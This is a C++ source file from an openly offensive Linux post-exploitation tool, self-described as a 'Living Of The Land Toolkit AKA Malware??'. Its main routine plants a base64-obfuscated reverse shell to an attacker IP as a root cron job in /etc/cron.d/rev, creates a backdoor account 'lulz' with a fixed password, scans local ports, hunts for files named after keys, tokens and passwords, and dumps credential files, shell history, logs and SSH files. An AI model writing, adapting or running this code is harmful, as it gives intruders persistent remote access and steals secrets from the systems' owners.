#include "init.h"
#include "../modules/executils.h"
#include "../modules/parsers.h"
#include "../tools/portscanner.h"
#include "../modules/base64.h"
#include <sstream>
#include <string>
#include <exception>
#include <iostream>
#include <cstdlib>
#include <vector>
#include <filesystem>
#include <algorithm>

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"
#define WHITE   "\033[37m"
#define BOLD    "\033[1m"
#define UNDERLINE "\033[4m"


void Init::welcome() {
    std::cout << BOLD << R"(

 ██▓     ▒█████  ▄▄▄█████▓ ██▓    
▓██▒    ▒██▒  ██▒▓  ██▒ ▓▒▓██▒    
▒██░    ▒██░  ██▒▒ ▓██░ ▒░▒██░    
▒██░    ▒██   ██░░ ▓██▓ ░ ▒██░    
░██████▒░ ████▓▒░  ▒██▒ ░ ░██████▒ 
░ ▒░▓  ░░ ▒░▒░▒░   ▒ ░░   ░ ▒░▓  ░
░ ░ ▒  ░  ░ ▒ ▒░     ░    ░ ░ ▒  ░
  ░ ░   ░ ░ ░ ▒    ░        ░ ░   
    ░  ░    ░ ░               ░  ░

    Living Of The Land Toolkit
            AKA
          Malware??

Author:  c0d3Ninja
Version: v0.16

========================================================
    )" << RESET << std::endl;
}

// Find senstive files by recursively scanning current path
namespace fs = std::filesystem;
std::vector<std::string> sensitiveFiles() {
    std::vector<std::string> content;
    std::string currentPath = fs::current_path();
    for (const fs::directory_entry& dir_entry : fs::recursive_directory_iterator(currentPath, fs::directory_options::skip_permission_denied)) {
        content.push_back(dir_entry.path().string());
    }
    return content;
}


// Config Struct for all the vectors dealing with the config config/lotl.conf file
// Output as well
struct Config{
    std::vector<std::string> required;
    std::vector<std::string> optional;
    std::vector<std::string> backdoor;
    std::vector<std::string> pam;
    std::vector<std::string> cron;
    std::vector<std::string> ssh;
    std::vector<std::string> user;
    std::vector<std::string> ip;
    std::vector<std::string> credPaths;
    std::vector<std::string> bashHistory;
    std::vector<std::string> requiredCommands;
    std::vector<std::string> optionalCommands;
    std::vector<std::string> credPathsFound;
    std::vector<std::string> bashHistoryFound;
    std::vector<std::string> logs;
    std::vector<std::string> logsFound;
    std::vector<std::string> checkSSH;
    std::vector<std::string> sshFound;
    std::vector<std::string> checkMount;
    std::vector<std::string> mountFound;
    std::vector<std::string> backUP;
    std::vector<std::string> backupFound;
    std::vector<std::string> sensitive;
    std::vector<std::string> sensitiveFound;
};

void Init::checkDependencies() {

    Config ParseConf;
    Config OutputConf;

    ParseConf.required = parseDependencies("config/lotl.conf", "required");
    ParseConf.optional = parseDependencies("config/lotl.conf", "optional");
    ParseConf.backdoor = parseDependencies("config/lotl.conf", "backdoor");
    ParseConf.ip = parseDependencies("config/lotl.conf", "ip");
    ParseConf.pam = parseDependencies("config/lotl.conf", "pam");
    ParseConf.cron = parseDependencies("config/lotl.conf", "cron");
    ParseConf.ssh = parseDependencies("config/lotl.conf", "ssh");
    ParseConf.user = parseDependencies("config/lotl.conf", "user");
    ParseConf.credPaths = parsePaths("config/lotl.conf", "checkCreds");
    ParseConf.bashHistory = parsePaths("config/lotl.conf", "checkBashHistory");
    ParseConf.logs = parsePaths("config/lotl.conf", "checkLogs");
    ParseConf.checkSSH = parsePaths("config/lotl.conf", "checkSSH");
    ParseConf.backUP = parsePaths("config/lotl.conf", "CheckBackUp");
    ParseConf.sensitive = parsePaths("config/lotl.conf", "checkSensitive");

    // Get the ip from the conf file to use for the backdoor
    std::vector<std::string> IP;
    for (const auto& ipAddress : ParseConf.ip) {
        IP.push_back(ipAddress);
    }

    // check backdoor option
    if (std::find(ParseConf.backdoor.begin(), ParseConf.backdoor.end(), std::string("yes")) != ParseConf.backdoor.end()) {
        for (const auto& pamOption : ParseConf.pam) {
            if (pamOption == "yes") {
                // pam code
            }
        }
        for (const auto& cronOption : ParseConf.cron) {
            if (cronOption == "yes") {
                std::string payload = "bash -i >& /dev/tcp/" + IP[0] + "/4444 0>&1";
                std::string encoded = base64_encode(payload);
                std::ostringstream cronJob;
                cronJob << "printf '*/5 * * * * root bash -c \"$(echo " << encoded << " | base64 -d)\"\\n' > /etc/cron.d/rev";
                std::string cmd = cronJob.str();
                std::string output = execCommand(cmd.c_str()); 
                std::string check = "grep 'base64 -d' /etc/cron.d/rev";
                int result = std::system(check.c_str());
                if (result == 0) {
                    std::cout << "Cron job exists!\n";
                } else {
                    std::cout << "Backdoor was not added!\n";
                }
            }
        }
        for (const auto& sshOption : ParseConf.ssh) {
            if (sshOption == "yes") {
                // process ssh
            }
        }

        for (const auto& userOption : ParseConf.user) {
            if (userOption == "yes"){
                std::string username = "lulz";
                std::string password = "passw0rd";
                std::string addUser = "useradd -m -s /bin/bash " + username;
                std::string setPass = "echo '" + username + ":" + password + "' | chpasswd";

                int resultUser = std::system(addUser.c_str());
                if (resultUser != 0) {
                    std::cerr << RED << "Failed to add " << username << RESET << "\n";
                }
                int resultPass = std::system(setPass.c_str());
                if (resultPass != 0) {
                    std::cerr << RED << "Error adding password" << "\n";
                }
            }
        }
    }

    for (const auto& path : ParseConf.credPaths) {
        if (checkPaths(path) == 1) {
            OutputConf.credPathsFound.push_back(path);
        }
    }

    for (const auto& path : ParseConf.bashHistory) {
        std::string expanded = expandPath(path);
        if (checkPaths(expanded) == 1) {
            OutputConf.bashHistoryFound.push_back(path);  // ✅ Correct vector
        }
    }

    for (const auto& cmd : ParseConf.required) {
        if (commandExists(cmd)) {
            OutputConf.requiredCommands.push_back(cmd);
        }
    }
    for (const auto& cmd: ParseConf.optional) {
        if(commandExists(cmd)) {
            OutputConf.optionalCommands.push_back(cmd);
        }
    }

    for (const auto& path : ParseConf.logs) {
        std::string expanded = expandPath(path);
        if (checkPaths(expanded) == 1) {
            OutputConf.logsFound.push_back(path);  // ✅ Correct vector
        }
    }

    for (const auto& path : ParseConf.checkSSH) {
        std::string expanded = expandPath(path);
        if (checkPaths(expanded) == 1) {
            OutputConf.sshFound.push_back(path);  // ✅ Correct vector
        }
    }

    for (const auto& path : ParseConf.checkMount) {
        std::string expanded = expandPath(path);
        if (checkPaths(expanded) == 1) {
            OutputConf.mountFound.push_back(path);  // ✅ Correct vector
        }
    }

    for (const auto& path : ParseConf.backUP) {
        std::string expanded = expandPath(path);
        if (checkPaths(expanded) == 1) {
            OutputConf.backupFound.push_back(path);  // ✅ Correct vector
        }
    }

    for (const auto& path : ParseConf.sensitive) {
        std::string expanded = expandPath(path);
        if (checkPaths(expanded) == 1) {
            OutputConf.sensitiveFound.push_back(path);  // ✅ Correct vector
        }
    }

    std::cout << "[*] Checking dependencies..." << "\n\n";

    std::cout << GREEN << "[+] Found: " << CYAN << OutputConf.requiredCommands.size() << RESET << " " << "(required) dependencies" << "\n";
    for (std::string output : OutputConf.requiredCommands) {
        std::cout << "\t" << YELLOW << output << RESET << "\n";
    }
    std::cout << GREEN << "[+] Found: " << CYAN << OutputConf.optionalCommands.size() << RESET <<  " " << "(optional) dependencies" << "\n";
    for (std::string output : OutputConf.optionalCommands) {
        std::cout << "\t" << YELLOW << output << RESET << "\n";
    }
    std::cout << GREEN << "[+] Found: " << CYAN << OutputConf.credPathsFound.size() << RESET << " " << "(Paths that might contain creds)" << "\n";
    for (std::string output : OutputConf.credPathsFound) {
        std::cout << "\t" << YELLOW << output << RESET << "\n";
    }
    std::cout << GREEN << "[+] Found: " << CYAN << OutputConf.bashHistoryFound.size() << RESET << " " << "History files" << "\n";
    for (std::string output : OutputConf.bashHistoryFound) {
        std::cout << "\t" << YELLOW << output << RESET << "\n";
    }
    std::cout << GREEN << "[+] Found: " << CYAN << OutputConf.logsFound.size() << RESET << " " << "Log files" << "\n";
    for (std::string output : OutputConf.logsFound) {
        std::cout << "\t" << YELLOW << output << RESET << "\n";
    }
    std::cout << GREEN << "[+] Found: " << CYAN << OutputConf.sshFound.size() << RESET << " " << "SSH files" << "\n";
    for (std::string output : OutputConf.sshFound) {
        std::cout << "\t" << YELLOW << output << RESET << "\n";
    }
    std::cout << GREEN << "[+] Found: " << CYAN << OutputConf.backupFound.size() << RESET << " " << "Backup files" << "\n";
    for (std::string output : OutputConf.backupFound) {
        std::cout << "\t" << YELLOW << output << RESET << "\n";
    }
    std::cout << GREEN << "[+] Found: " << CYAN << OutputConf.sensitiveFound.size() << RESET << " " << "Sensitive files" << "\n";
    for (std::string output : OutputConf.sensitiveFound) {
        std::cout << "\t" << YELLOW << output << RESET << "\n";
    }

    // Get system information
    std::string unameResults;
    std::string hostnameResults;
    std::string whoamiResults;
    std::string uptimeResults;
    std::string mountResults;
    
    try {
        for (const std::string& cmd : OutputConf.requiredCommands) {
            if (cmd == "uname") {
                unameResults = execCommand("uname -a");
            }
            else if (cmd == "hostname") {
                hostnameResults = execCommand("hostname");
            } else if (cmd == "whoami"){
                uptimeResults = execCommand("uptime");
            } else if (cmd == "mount") {
                mountResults = execCommand("mount");
            }
        }
        // Optional: Trim newlines
        if (!unameResults.empty()) {
            unameResults.erase(unameResults.find_last_not_of("\n") + 1);
        }
        if (!hostnameResults.empty()) {
            hostnameResults.erase(hostnameResults.find_last_not_of("\n") + 1);
        }
        if (!uptimeResults.empty()) {
            uptimeResults.erase(uptimeResults.find_last_not_of("\n") + 1);
        }
        if (!mountResults.empty()) {
            mountResults.erase(mountResults.find_last_not_of("\n") + 1);
        }
    }
    catch (const std::exception& e) {
        std::cerr <<  "Error: " << e.what() << "\n";
    }

    // ifconfig
    std::string ifconfig;
    std::string inet;
    std::vector<int> openPorts;
    std::vector<std::string> ip_port_list;
    if (commandExists("ifconfig")) {
        ifconfig = execCommand("ifconfig");
        if (!ifconfig.empty()) {
            ifconfig.erase(ifconfig.find_last_not_of("\n") + 1);
            size_t pos = ifconfig.find("inet ");
            if (pos != std::string::npos) {
                size_t start = pos + 5; // Skip "inet "
                size_t end = ifconfig.find(" ", start);
                if (end != std::string::npos) {
                    std::string ip = ifconfig.substr(start, end - start);
                    inet = ip;
                    int startPort = 1;
                    int endPort = 10000;
                    for (int port = startPort; port <= endPort; ++port) {
                        if (isPortOpen(ip, port)) {
                            openPorts.push_back(port);
                        } else {
                            continue;
                        }
                    }
                }
            }
        }
    }

    std::cout << "\n";

    std::cout << RED << "\t================= System Information =================\n\n" << RESET;

    std::cout << "Uname: " << YELLOW << unameResults << RESET << "\n\n";
    std::cout << "Hostname: " << YELLOW << hostnameResults << RESET << "\n\n";
    std::cout << "Uptime: " << YELLOW << uptimeResults << RESET << "\n\n";
    std::cout << "Mount: \n" << YELLOW << mountResults << RESET << "\n\n";
    std::cout << "Local IP: " << YELLOW << inet << RESET << "\n\n";
    std::cout << "Open Ports: ";
    std::string parsePort;
    for (int ports : openPorts) {
        parsePort += std::to_string(ports) + ",";
    }
    parsePort.pop_back();
    std::cout << YELLOW << parsePort << RESET;
    std::cout << "\n\n";
    
    std::cout << RED << "\t======================================================\n\n\n\n" << RESET;



    std::cout << RED << "\t================= Sensitive Information ===============\n\n" << RESET;

    std::string currentPath = fs::current_path();
    std::cout << "Path: " << currentPath << "\n";
    std::vector<std::string> results = sensitiveFiles();
    std::vector<std::string> secrets = {"config", "keys", "password", "tokens", 
        "credentials", "secret", "private", "public", "ssh", "rsa", 
        "pem", "key", "token", "credential", "credentials",
        "auth", "database", "conf" };

    for (const std::string& files : results) {
        for (const std::string& secret : secrets) {
            if (files.find(secret) != std::string::npos) {
                std::cout << secret << " in " << MAGENTA << files << RESET << "\n";
            }
        }
    }

    std::cout << "\n\n";
    
    std::cout << RED << "\t======================================================\n\n" << RESET;

    std::cout << "\n";
    std::cout << RED << "Displaying the contents of the paths that might contain creds..." << "\n\n";

    for (const auto& path : OutputConf.credPathsFound) {
        std::string expanded = expandPath(path);
        if (checkPaths(expanded) == 1) {
            std::string cmd = "cat \"" + expanded + "\"";
            std::string output = execCommand(cmd);
            std::cout << GREEN << "[+] Contents of " << MAGENTA << path << ":\n" <<RESET << YELLOW << output << RESET << "\n";
        }
    }  
    std::cout << "\n";
    std::cout << RED << "Displaying the contents of the history files..." << "\n\n";

    for (const auto& path : OutputConf.bashHistoryFound) {
        std::string expanded = expandPath(path);
        if (checkPaths(expanded) == 1) {
            if (expanded == std::string(getenv("HOME")) + "/.zsh_history") {
                // Don't display the content of zsh_history
                continue;
            }
            std::string cmd = "cat \"" + expanded + "\"";
            std::string output = execCommand(cmd);
            std::cout << GREEN << "[+] Contents of " << MAGENTA << path << ":\n" << RESET << YELLOW << output << RESET << "\n";
        }
    }
    std::cout << "\n";
    if (OutputConf.sensitiveFound.size() > 0) {
        std::cout << RED << "Displaying the contents of the sensitive files..." << "\n\n";

        for (const auto& path : OutputConf.sensitiveFound) {
            std::string expanded = expandPath(path);
            if (checkPaths(expanded) == 1) {
                std::string cmd = "cat \"" + expanded + "\"";
                std::string output = execCommand(cmd);
                std::cout << GREEN << "[+] Contents of " << MAGENTA << path << ":\n" << RESET << YELLOW << output << RESET << "\n";
            }
        }
    }
    if (OutputConf.logsFound.size() > 0) {
        std::cout << "\n";
        std::cout << RED << "Displaying the contents of the logs..." << "\n\n";
        for (const auto& path : OutputConf.logsFound) {
            std::string expanded = expandPath(path);
            if (checkPaths(expanded) == 1) {
                std::string cmd = "cat \"" + expanded + "\"";
                std::string output = execCommand(cmd);
                std::cout << GREEN << "[+] Contents of " << MAGENTA << path << ":\n" << RESET << YELLOW << output << RESET << "\n";
            }
        }
    }

    if (OutputConf.sshFound.size() > 0) {
        std::cout << "\n";
        std::cout << RED << "Displaying the contents of the ssh files..." << "\n\n";
        for (const auto& path : OutputConf.sshFound) {
            std::string expanded = expandPath(path);
            if (checkPaths(expanded) == 1) {
                std::string cmd = "cat \"" + expanded + "\"";
                std::string output = execCommand(cmd);
                std::cout << GREEN << "[+] Contents of " << MAGENTA << path << ":\n" << RESET << YELLOW << output << RESET << "\n";
            }
        }
    }
}